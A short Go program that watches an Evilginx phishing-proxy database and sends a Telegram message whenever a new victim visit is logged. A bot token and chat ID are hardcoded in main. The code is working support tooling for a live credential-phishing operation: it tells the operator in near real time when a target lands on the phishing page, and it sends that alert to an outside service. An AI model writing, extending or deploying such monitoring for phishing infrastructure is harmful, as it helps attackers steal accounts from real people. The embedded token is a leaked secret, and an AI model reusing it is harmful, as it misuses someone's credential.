package main

import (
    "database/sql"
    "fmt"
    "log"
    "net/http"
    "net/url"
    "time"

    _ "github.com/mattn/go-sqlite3"
)

func sendTelegram(botToken, chatID, message string) {
    apiURL := "https://api.telegram.org/bot" + botToken + "/sendMessage"

    data := url.Values{}
    data.Set("chat_id", chatID)
    data.Set("text", message)

    _, err := http.PostForm(apiURL, data)
    if err != nil {
        log.Printf("Failed to send Telegram message: %v\n", err)
    }
}

func main() {
    // ADD YOUR TOKEN + CHAT ID BEFORE PUSHING
    botToken := "8471535230:AAFtKZ2V4zkcCW6yTHs1rGrdb9waaiDQzIQ"
    chatID := "7600034451"

    dbPath := "/root/.evilginx/data.db"

    db, err := sql.Open("sqlite3", dbPath)
    if err != nil {
        log.Fatalf("Failed to open DB: %v", err)
    }
    defer db.Close()

    var lastTimestamp string

    fmt.Println("🔥 Evilginx Monitor Started")
    fmt.Println("Watching DB:", dbPath)
    fmt.Println("----------------------------------------")

    for {
        rows, err := db.Query("SELECT timestamp FROM logs ORDER BY timestamp DESC LIMIT 1")
        if err != nil {
            log.Printf("Query error: %v", err)
            time.Sleep(3 * time.Second)
            continue
        }

        var ts string
        if rows.Next() {
            rows.Scan(&ts)
        }
        rows.Close()

        if lastTimestamp == "" {
            lastTimestamp = ts
        }

        if ts != "" && ts != lastTimestamp {
            msg := fmt.Sprintf("New Visit → Timestamp: %s", ts)

            // Terminal display
            fmt.Println(msg)

            // Telegram message
            sendTelegram(botToken, chatID, msg)

            lastTimestamp = ts
        }

        time.Sleep(3 * time.Second)
    }
}